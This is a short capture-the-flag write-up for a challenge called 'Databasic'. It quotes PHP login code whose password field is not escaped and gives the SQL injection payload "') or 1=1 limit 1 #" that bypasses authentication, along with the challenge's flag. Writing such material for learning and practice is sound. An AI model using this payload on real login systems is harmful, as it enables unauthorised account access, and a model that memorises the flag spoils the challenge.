# Databasic

1. First, lets go through the web and view the source code on the git repository. 
2. Then, we can find out the critical code here : 
    ```
    $query = sprintf("SELECT * FROM haxorz_memberz WHERE login = '%s' AND password = MD5('%s')",
		mysqli_real_escape_string($con, $_POST['login']),
		$_POST['password']
	);
    ```
    [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)
    As we can see, the "login" part is filted by the command "mysqli_real_escape_string()", so obviously we can't use sql injection on it. However, lets see the "password" part and we are able to find out that it is not filtered. It's clearly that it can be sql injection.
3. Next, we have to notice a part of the code : 
    ```
    if (@mysqli_num_rows($sql) == 1)
		$auth = TRUE;
    ```
    [mysqli_num_rows()](https://www.w3schools.com/php/func_mysqli_num_rows.asp)
    As you can see, we have to satisfy the situation to get the flag. To reach the goal, we have to use the keyword "limit" to help us. 
4. Here is the payload : 
    ```
    login : admin
    password : ') or 1=1 limit 1 #
    ```
    So the sentence will become : 
    ```
    SELECT * FROM haxorz_memberz WHERE login = 'admin' AND password = MD5('') or 1=1 limit 1 #')
    ```
5. Here is the flag : W3C{wen_eta_mysqli_real_md5_string()?}
